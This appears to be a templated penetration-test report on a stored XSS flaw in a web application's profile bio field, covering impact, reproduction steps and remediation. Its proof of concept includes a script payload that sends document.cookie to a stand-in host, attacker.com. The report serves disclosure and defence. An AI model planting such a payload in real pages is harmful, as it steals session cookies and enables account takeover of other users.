# Penetration Testing Writeup: XSS in User Profile

## Executive Summary

A Stored Cross-Site Scripting (XSS) vulnerability was identified in [Target
Application]’s user profile editing feature during a penetration test. This flaw
allows attackers to inject scripts that execute for users viewing the profile,
risking data theft and account compromise. This report provides details and
remediation steps.

## Vulnerability Details

- **Vulnerability Type**: Cross-Site Scripting (XSS) - Stored
- **Severity**: Critical
- **Affected Component**: User profile bio field
- **CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)
- **Location**: `https://[target-application]/profile/[user-id]`
- **Discovered By**: [PenTester Name]
- **Date Discovered**: August 27, 2025

### Description

The user profile bio field does not sanitize inputs before saving them to the
database. When the profile is viewed, the stored data is rendered without
encoding, allowing script execution.

### Impact

- **Account Takeover**: Cookies can be stolen.
- **Data Exfiltration**: Profile data can be sent to attackers.
- **Phishing**: Fake forms can capture credentials.
- **Reputation Damage**: Defacement can harm trust.

### Proof of Concept

1. Edit the profile bio with: `<script>alert('Stored XSS');</script>`.
2. View the profile and observe the alert.
3. Malicious payload:
   `<script>fetch('https://attacker.com/steal?cookie='+document.cookie);</script>`.

### Steps to Reproduce

1. Navigate to `https://[target-application]/profile/edit`.
2. Enter `<script>alert('Stored XSS');</script>` in the bio field.
3. Save and view the profile to confirm the alert.

## Remediation Recommendations

1. **Input Sanitization**:
   - Use OWASP AntiSamy to filter bio inputs.
2. **Output Encoding**:
   - Encode bio data before rendering.
3. **Content Security Policy**:
   - Apply CSP: `Content-Security-Policy: script-src 'self';`.
4. **Secure Development**:
   - Train developers on XSS prevention.
5. **Regular Testing**:
   - Conduct security audits.

## Conclusion

The Stored XSS vulnerability in [Target Application]’s profile feature is
critical and requires immediate remediation.

## References

- OWASP XSS Prevention Cheat Sheet:
  https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- CWE-79: https://cwe.mitre.org/data/definitions/79.html

![Profile XSS Alert](https://example.com/images/profile-xss-alert.png)
